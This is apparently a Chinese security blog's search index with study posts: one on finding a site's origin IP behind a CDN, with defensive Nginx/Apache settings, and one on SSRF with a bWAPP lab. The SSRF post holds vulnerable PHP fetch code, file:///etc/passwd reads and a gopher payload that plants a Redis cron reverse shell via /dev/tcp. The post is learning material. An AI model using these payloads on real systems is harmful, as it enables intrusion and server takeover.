<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>绕过CDN查找ip方法总结</title>
      <link href="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/"/>
      <url>/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="绕过CDN查找真实IP方法总结"><a href="#绕过CDN查找真实IP方法总结" class="headerlink" title="绕过CDN查找真实IP方法总结"></a>绕过CDN查找真实IP方法总结</h2><h4 id="什么是CDN以及CDN加速？"><a href="#什么是CDN以及CDN加速？" class="headerlink" title="什么是CDN以及CDN加速？"></a>什么是CDN以及CDN加速？</h4><p><strong>(摘自百度百科）</strong></p><p>​        CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><p>​    <img src="https://bkimg.cdn.bcebos.com/pic/4610b912c8fcc3ce005c05d19c45d688d53f20b0?x-bce-process=image/watermark,g_7,image_d2F0ZXIvYmFpa2U4MA==,xp_5,yp_5" alt="img"></p><p>比较常见的基于公有云的高可用架构，即：</p><pre><code>域名--&gt;CDN，CDN--&gt;WAF，WAF--&gt;SLB，SLB--&gt;ECS</code></pre><p><strong>CDN对网站有什么好处?</strong></p><p>​    首先，开启CDN后的网站，会根据用户所在地的不同访问CDN的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源,降低服务器压力。这也就是大家都在ping百度,但是不同地区得到的反馈ip不一样的原因。</p><p>​    其次，由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p><p><strong>为什么我们需要绕过CDN？</strong></p><pre><code>   对于我们渗透测试者来说，我们在信息收集中重要的一步就是要得到目标服务器主机的**真实IP地址**，但如果目标服务器部署了CDN服务，那么往往我们直接访问得到的IP只是CDN节点服务器的IP，而不是真实的源服务器的IP地址，这是就需要我们想办法绕过CDN获取源服务器IP。</code></pre><p>下面我收集了一些常见的绕过CDN的方法，留作记录:</p><h4 id="验证是否存在CDN"><a href="#验证是否存在CDN" class="headerlink" title="验证是否存在CDN"></a>验证是否存在CDN</h4><h5 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h5><p>很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br> <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br> <a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br> <a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a></p><p>我们这里打开第一个网站：ping一下<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427093341.png" alt=""></p><p>这里可以看出百度的独立IP有17个，且各个节点的返回速度存在不同的延迟。说明百度采用了CDN服务，但是ping没有办法确认真实IP。</p><h5 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h5><p>使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p><blockquote><p> <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a><br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p><p> 非权威应答:<br> 名称:    163.xdwscache.ourglb0.com<br> Addresses:  58.223.164.86</p><p> ​          125.75.32.252<br> Aliases:  <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a></p><p> ​          <a href="http://www.163.com.lxdns.com/" target="_blank" rel="noopener">www.163.com.lxdns.com</a></p></blockquote><p>无 CDN 的示例：</p><blockquote><p> xiaix.me<br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p><p> 非权威应答:<br> 名称:    xiaix.me<br> Address:  192.3.168.172  </p></blockquote><p>下面我收集了一些常见的绕过CDN查找真实IP的方法，留作记录:</p><h4 id="绕过-CDN-查找网站真实-IP"><a href="#绕过-CDN-查找网站真实-IP" class="headerlink" title="绕过 CDN 查找网站真实 IP"></a>绕过 CDN 查找网站真实 IP</h4><h5 id="1-查询历史DNS记录"><a href="#1-查询历史DNS记录" class="headerlink" title="1:查询历史DNS记录"></a>1:查询历史DNS记录</h5><p>1）查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br> <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>     ###DNS查询<br> <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>    ###微步在线<br> <a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a>    ###在线域名信息查询<br> <a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a>        ###DNS、IP等查询<br> <a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a>  ###CDN查询IP</p><p>2）利用<a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</p><p>如何寻找隐藏在CloudFlare或TOR背后的真实原始IP</p><p><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009230838766-860479177.png" alt="img"></p><p>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</p><p><strong>MX记录</strong></p><p>邮件交换记录 (<strong>MX record</strong>)是域名系统（DNS）中的一种资源记录类型，用于指定负责处理发往收件人域名的邮件服务器</p><h5 id="2-查询子域名寻找真实IP"><a href="#2-查询子域名寻找真实IP" class="headerlink" title="2.查询子域名寻找真实IP"></a>2.查询子域名寻找真实IP</h5><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p><p>下面介绍些常用的子域名查找的方法和工具：</p><p>1）微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>)</p><p>上文提到的微步在线功能强大，黑客只需输入要查找的域名(如baidu.com)，点击子域名选项就可以查找它的子域名了，但是免费用户每月只有5次免费查询机会。如图：</p><p><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009230922994-1826758810.png" alt="img"></p><p>2）Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)</p><p>黑客只需输入baidu.com type:A就能收集百度的子域名和ip了。如图：<br> <img src="QQ%E6%88%AA%E5%9B%BE20200427094630.png" alt=""></p><p>3）Google 搜索</p><p>Google site:baidu.com -www就能查看除www外的子域名，如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427095533.png" alt=""></p><p>4）各种子域名扫描器</p><p>这里，主要为大家推荐子域名挖掘机和lijiejie的subdomainbrute(<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a>)</p><p>子域名挖掘机仅需输入域名即可基于字典挖掘它的子域名，如图：</p><p><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009231018377-2070670991.png" alt="img"></p><p>Subdomainbrute以windows为例，黑客仅需打开cmd进入它所在的目录输入Python subdomainbrute.py baidu.com –full即可收集百度的子域名，如图：</p><p><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009231030794-1664451845.png" alt="img"></p><p>注：收集子域名后尝试以解析ip不在cdn上的ip解析主站，真实ip成功被获取到。</p><h5 id="3：网络空间引擎搜索法"><a href="#3：网络空间引擎搜索法" class="headerlink" title="3：网络空间引擎搜索法"></a>3：网络空间引擎搜索法</h5><p>常见的有以前的钟馗之眼，<a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a>，<a href="https://fofa.so/" target="_blank" rel="noopener">fofa搜索</a>。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip，如图：<br><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009231044976-1731199101.png" alt="img"> </p><h5 id="4-利用SSL证书寻找真实原始IP"><a href="#4-利用SSL证书寻找真实原始IP" class="headerlink" title="4:利用SSL证书寻找真实原始IP"></a>4:利用SSL证书寻找真实原始IP</h5><p><strong>SSL证书</strong></p><p>​        SSL证书是<a href="https://baike.baidu.com/item/数字证书/326874" target="_blank" rel="noopener">数字证书</a>的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。SSL 证书就是遵守 SSL协议，由受信任的数字证书颁发机构CA，在验证服务器身份后颁发，具有服务器身份验证和数据传输加密功能。</p><p>​        以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。</p><p>​        为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443<code>https://136.23.63.44:443</code>上直接连接到IP时，SSL证书就会被暴露。</p><p>​        此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。</p><p><a href="https://link.zhihu.com/?target=https%3A//censys.io/certificates/">https://censys.io/certificates/</a> 通过SSL证书查询真实IP（推荐）</p><p><strong>Censys证书查询搜索步骤如下：</strong></p><p>1、aaa.com 证书的搜索查询参数为：<code>parsed.names：aaa.com</code></p><p>只显示有效证书的查询参数为：<code>tags.raw：trusted</code></p><p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p><p>2、组合后的搜索参数为：<code>parsed.names: aaa.com and tags.raw: trusted</code></p><p>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的“<strong>Explore</strong>”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; <strong>IPv4 Hosts</strong>；</p><p><img src="https://www.fujieace.com/wp-content/uploads/2019/07/1077.jpg?x83086" alt="Censys空间搜索SHA1指纹"></p><p>隐藏服务具有SSL证书，要查找它使用的IPv4，只需将”SHA1 fingerprint”（签名证书的sha1值，也就是SHA1指纹）粘贴到Censys平台IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器真实IP。</p><h5 id="方法5-利用HTTP标头寻找真实原始IP"><a href="#方法5-利用HTTP标头寻找真实原始IP" class="headerlink" title="方法5:利用HTTP标头寻找真实原始IP"></a>方法5:利用HTTP标头寻找真实原始IP</h5><p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p><p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p><p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p><p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下</p><p>80.http.get.headers.server:cloudflare</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009231212219-1764707602.png" alt="img"></h3><h5 id="方法6-利用网站返回的内容寻找真实原始IP"><a href="#方法6-利用网站返回的内容寻找真实原始IP" class="headerlink" title="方法6:利用网站返回的内容寻找真实原始IP"></a>方法6:利用网站返回的内容寻找真实原始IP</h5><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p><p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p><p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p><pre><code>ga（&#39;create&#39;，&#39;UA-93577176-1&#39;，&#39;auto&#39;）;</code></pre><p>​        可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p><p><strong>Shodan</strong></p><p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p><h5 id="7-使用国外主机解析域名"><a href="#7-使用国外主机解析域名" class="headerlink" title="7:使用国外主机解析域名"></a>7:使用国外主机解析域名</h5><p>​        国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p><p>​       我这里通过国外主机nslookup查询国内163.com对应IP。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427095107.png" alt=""></p><p>我们可以看到只返回了一条对应IP，猜测应该是真实IP。</p><p>这里推荐一个国外的多节点ping工具。</p><p>域名：<a href="http://www.just-ping.com/" target="_blank" rel="noopener">http://www.just-ping.com/</a></p><h5 id="8-网站漏洞查找"><a href="#8-网站漏洞查找" class="headerlink" title="8:网站漏洞查找"></a>8:网站漏洞查找</h5><p>1.目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</p><p> 2.XSS盲打，命令执行反弹shell，SSRF等。可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</p><p> 3.无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p><h5 id="9-网站邮件订阅查找"><a href="#9-网站邮件订阅查找" class="headerlink" title="9:网站邮件订阅查找"></a>9:网站邮件订阅查找</h5><p>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p><h4 id="如何防止CDN被绕过？"><a href="#如何防止CDN被绕过？" class="headerlink" title="如何防止CDN被绕过？"></a>如何防止CDN被绕过？</h4><p>通过中间件配置只允许域名访问，禁止ip访问。</p><p>这样处理的话，所有直接访问站点真实IP的请求将会被拒绝，任何用户只能通过域名访问站点，通过预先设定的网络链路，从DNS→CDN→waf防护→源站，所有的域名访问请求都必须经过WAF检测。</p><h5 id="Nginx参考配置："><a href="#Nginx参考配置：" class="headerlink" title="Nginx参考配置："></a>Nginx参考配置：</h5><pre><code>#添加一个server,在原server里绑定域名server  {        listen 80 default;        server_name _;        return 403;    }server {        listen       80;        server_name  www.demo.com;        .........</code></pre><h5 id="Apache参考配置"><a href="#Apache参考配置" class="headerlink" title="Apache参考配置:"></a>Apache参考配置:</h5><pre><code>#在httpd.conf最后面加上&lt;VirtualHost 此处填写IP&gt;        ServerName 此处填写IP        &lt;Location /&gt;            Order Allow,Deny            Deny from all        &lt;/Location&gt;&lt;/VirtualHost&gt;&lt;VirtualHost 此处填写IP&gt;        DocumentRoot /var/www/html        ServerName   此处填写域名&lt;/VirtualHost&gt;</code></pre><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://zhuanlan.zhihu.com/p/116026247" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/116026247</a></p><p><a href="https://zhuanlan.zhihu.com/p/107294740" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/107294740</a></p><p><a href="https://www.fujieace.com/penetration-test/cdn-find-ip.html" target="_blank" rel="noopener">https://www.fujieace.com/penetration-test/cdn-find-ip.html</a></p><p><a href="https://forum.90sec.com/t/topic/524" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/524</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过CDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的SSRF漏洞学习</title>
      <link href="/2020/04/20/ssrf-lou-dong-xue-xi/"/>
      <url>/2020/04/20/ssrf-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="SSRF漏洞部分"><a href="#SSRF漏洞部分" class="headerlink" title="SSRF漏洞部分"></a>SSRF漏洞部分</h3><h4 id="SSRF简述"><a href="#SSRF简述" class="headerlink" title="SSRF简述"></a>SSRF简述</h4><p><img src="20181227082125119.png" alt=""></p><p>​       SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><h5 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" title="漏洞形成原因"></a>漏洞形成原因</h5><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>例如：</p><p><code>www.xxx.com/a.php?image=http://www.abc.com/1.jpg</code></p><p>如果我们将<a href="http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></p><p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p><p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现这个请求是否合法，然后服务器以他的身份来访问其他服务器的资源。</p><p><strong>curl造成的SSRF</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>file_get_contents造成的SSRF</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h5 id="SSRF常见出现位置"><a href="#SSRF常见出现位置" class="headerlink" title="SSRF常见出现位置"></a>SSRF常见出现位置</h5><ul><li>分享：通过URL地址分享网页内容</li><li>转码服务</li><li>在线翻译</li><li>图片加载与下载：通过URL地址加载或下载图片</li><li>图片、文章收藏功能</li><li>未公开API实现以及其他调用URL的功能</li></ul><h5 id="SSRF验证方法"><a href="#SSRF验证方法" class="headerlink" title="SSRF验证方法"></a>SSRF验证方法</h5><p>1.因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p><p>2.在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><h5 id="利用SSRF漏洞"><a href="#利用SSRF漏洞" class="headerlink" title="利用SSRF漏洞"></a>利用SSRF漏洞</h5><ol><li>让服务器去访问相应的网址</li><li>让服务器去访问自己所处内网的一些指纹文件来判断是否存在相应的CMS</li><li>可以使用file、dict、gopher、ftp协议进行请求访问相应的文件</li><li>攻击运行在内网或本地的应用程序（比如溢出）;</li><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li></ol><p>SSRF中各个编程语言可以使用的协议如下图所示：</p><p><img src="D:%5Cblog%5Csource_posts%5CSSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%5C12.png" alt=""></p><ul><li><p>file协议</p><p>​    查看文件：file:///etc/passwd</p></li><li><p>dict协议</p><p>​    探测端口：dict://127.0.0.1:80</p></li><li><p>gopher协议</p><p>​    Gopher协议可以做很多，特别是在SSRF漏洞中可以发挥很多重要的作用，利用此协议可以攻击内网的FTP、Telnet Redis Memcache 也可以进行GET POST请求 .</p><pre><code>curl -v &#39;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#39;</code></pre></li></ul><ol><li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包）</li><li>攻击内网应用程序（利用跨协议通信技术）</li><li>DOS攻击</li><li>判断内网主机是否存活：访问是否有端口开放</li></ol><h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><ul><li><p>@绕过：<code>http://xxx.com@10.10.10.10=10.10.10.10</code></p></li><li><p>利用特殊的域名</p></li><li><p>利用句号</p><p>127。0。0。1=&gt;127.0.0.1</p></li><li><p>利用协议</p></li><li><p>利用Enclosed </p></li><li><p>IP使用其他进制：127.0.0.1=2130706433</p></li><li><p>使用短地址：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ==<a href="https://dwz.lc/2fGYWaE" target="_blank" rel="noopener">https://dwz.lc/2fGYWaE</a></p></li></ul><h5 id=""><a href="#" class="headerlink" title=""></a><img src="QQ%E6%88%AA%E5%9B%BE20200212110340.png" alt=""></h5><h4 id="bWAPP靶场实战（SSRF"><a href="#bWAPP靶场实战（SSRF" class="headerlink" title="bWAPP靶场实战（SSRF)"></a>bWAPP靶场实战（SSRF)</h4><h5 id="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"><a href="#一、使用（RFI）远程文件包含进行端口扫描（内网探测）" class="headerlink" title="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"></a>一、使用（RFI）远程文件包含进行端口扫描（内网探测）</h5><p>我们进入bWAPP  SSRF部分。</p><img src="QQ截图20200128162933.png" style="zoom:50%;" /><p>我们点击黑体字Port scan得到了端口扫描的攻击脚本</p><img src="QQ截图20200128163234.png" style="zoom:50%;" /><p>我们退出SSRF模块 进入（RFI/LFI)模块，发现?language=lang_en.php此处可能存在文件包含漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128163521.png" alt=""></p><p>我们在VM中开启了虚拟机，得知IP为192.168.153.131</p><img src="QQ截图20200128164256.png" style="zoom:50%;" /><h5 id="二、使用XXE获取敏感文件中的内容"><a href="#二、使用XXE获取敏感文件中的内容" class="headerlink" title="二、使用XXE获取敏感文件中的内容"></a>二、使用XXE获取敏感文件中的内容</h5><p>我们先点击黑体字获取XXE攻击脚本。</p><img src="QQ截图20200128170206.png" style="zoom:67%;" /><p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p><p> 然后使用Burp抓包后发送到Repeater模块，</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p><p> 第一次我们使用http协议读取robots.txt文件内容</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p><p>第二次我们使用php协议读取 xml页面中的内容</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p><p>第三次我们使用file协议读取本机的/etc/passwd的内容</p><img src="QQ截图20200128180043.png" style="zoom:67%;" /><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://xz.aliyun.com/t/7333" target="_blank" rel="noopener">https://xz.aliyun.com/t/7333</a></p><p><a href="https://damit5.com/2018/05/26/SSRF-漏洞学习" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0</a></p><p><a href="https://www.cnblogs.com/zhaijiahui/p/7828585.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/7828585.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python编写子域名爆破小工具</title>
      <link href="/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/"/>
      <url>/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python编写sql注入&amp;xml注入工具</title>
      <link href="/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/"/>
      <url>/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python编写C段&amp;web目录扫描工具</title>
      <link href="/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/"/>
      <url>/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>“python之正则表达式学习”</title>
      <link href="/2020/04/19/python-zhi-zheng-ze-biao-da-shi-xue-xi/"/>
      <url>/2020/04/19/python-zhi-zheng-ze-biao-da-shi-xue-xi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp5框架学习</title>
      <link href="/2020/04/19/thinkphp5-kuang-jia-xue-xi/"/>
      <url>/2020/04/19/thinkphp5-kuang-jia-xue-xi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>熊海cms代码审计学习</title>
      <link href="/2020/04/19/xiong-hai-cms-dai-ma-shen-ji-xue-xi/"/>
      <url>/2020/04/19/xiong-hai-cms-dai-ma-shen-ji-xue-xi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 代码审计学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xhcms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Axublog代码审计学习</title>
      <link href="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/"/>
      <url>/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/</url>
      
